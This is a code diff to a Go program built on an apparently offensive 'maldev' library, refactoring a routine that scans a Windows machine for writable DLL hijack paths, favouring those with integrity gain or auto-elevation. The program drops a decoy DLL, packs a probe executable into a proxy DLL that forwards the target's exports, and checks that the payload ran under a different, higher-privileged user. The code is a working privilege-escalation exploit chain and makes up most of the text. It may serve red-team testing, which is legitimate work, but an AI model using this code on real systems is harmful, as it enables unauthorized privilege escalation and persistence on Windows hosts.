@@ -50,7 +50,6 @@ import (
 	"strings"
 	"time"
 
-	"github.com/oioio-space/maldev/pe/dllproxy"
 	"github.com/oioio-space/maldev/pe/packer"
 	"github.com/oioio-space/maldev/recon/dllhijack"
 )
@@ -115,31 +114,10 @@ func main() {
 	// services, scheduled tasks, and auto-elevate opportunities, then
 	// picks the highest-ranked one with a writable search dir.
 	if *autoDiscover {
-		logStep("scanning the box for hijack opportunities (recon/dllhijack.ScanAll)")
-		opps, err := dllhijack.ScanAll()
+		logStep("scanning the box for hijack opportunities (recon/dllhijack.PickBestWritable)")
+		best, err := dllhijack.PickBestWritable()
 		if err != nil {
-			fatal("dllhijack.ScanAll: %v", err)
-		}
-		opps = dllhijack.Rank(opps)
-		var best *dllhijack.Opportunity
-		for i := range opps {
-			if opps[i].Writable && (opps[i].IntegrityGain || opps[i].AutoElevate) {
-				best = &opps[i]
-				break
-			}
-		}
-		if best == nil {
-			// Fall back to any writable opportunity (no integrity gain
-			// but proves the path).
-			for i := range opps {
-				if opps[i].Writable {
-					best = &opps[i]
-					break
-				}
-			}
-		}
-		if best == nil {
-			fatal("no writable hijack opportunities found on this box (scanned %d total)", len(opps))
+			fatal("dllhijack.PickBestWritable: %v", err)
 		}
 		logStep("picked: kind=%s id=%s binary=%s hijack-as=%s integrity-gain=%v",
 			best.Kind, best.ID, best.BinaryPath, best.HijackedDLL, best.IntegrityGain)
@@ -180,31 +158,23 @@ func main() {
 		}
 		logStep("dropped fakelib.dll (%d bytes embedded → %s)", len(fakelibBytes), fakelibPath)
 
-		// (b) Parse fakelib's exports — "live discovery". Reading
-		// from disk (not from the embedded bytes) so the operator
-		// could swap fakelib.dll for any other DLL between drops
-		// and the next pack would adapt to that DLL's exports.
+		// (b) Pack probe.exe + mirror fakelib's exports as
+		// forwarders. Re-reads from disk (not the embedded bytes)
+		// so an operator can swap fakelib.dll for any other DLL
+		// between the drop and the pack and the export list adapts
+		// automatically. [packer.PackProxyDLLFromTarget] fuses the
+		// parse + filter + pack chain — one call, single error
+		// path.
 		fakelibOnDisk, err := os.ReadFile(fakelibPath)
 		if err != nil {
 			fatal("re-read fakelib: %v", err)
 		}
-		exports, err := dllproxy.ExportsFromBytes(fakelibOnDisk)
-		if err != nil {
-			fatal("parse fakelib: %v", err)
-		}
-		if len(exports) == 0 {
-			fatal("fakelib has no named exports — Mode 10 needs ≥1")
-		}
-		logStep("parsed %d named exports from fakelib: %v", len(exports), exportNames(exports))
-
-		// (c) Pack probe.exe + mirror fakelib's exports as forwarders.
-		out, _, err := packer.PackProxyDLL(probeBytes, packer.ProxyDLLOptions{
+		out, _, err := packer.PackProxyDLLFromTarget(probeBytes, fakelibOnDisk, packer.ProxyDLLOptions{
 			PackOpts:   packOpts,
 			TargetName: "fakelib",
-			Exports:    exports,
 		})
 		if err != nil {
-			fatal("PackProxyDLL (Mode 10): %v", err)
+			fatal("PackProxyDLLFromTarget (Mode 10): %v", err)
 		}
 		packed = out
 	default:
@@ -273,14 +243,6 @@ func main() {
 	default:
 		fatal("FAIL: payload ran as the SAME user (%q) — no privilege escalation occurred", gotID)
 	}
-}
-
-func exportNames(es []dllproxy.Export) []string {
-	out := make([]string, 0, len(es))
-	for _, e := range es {
-		out = append(out, e.Name)
-	}
-	return out
 }
 
 func currentUser() string {
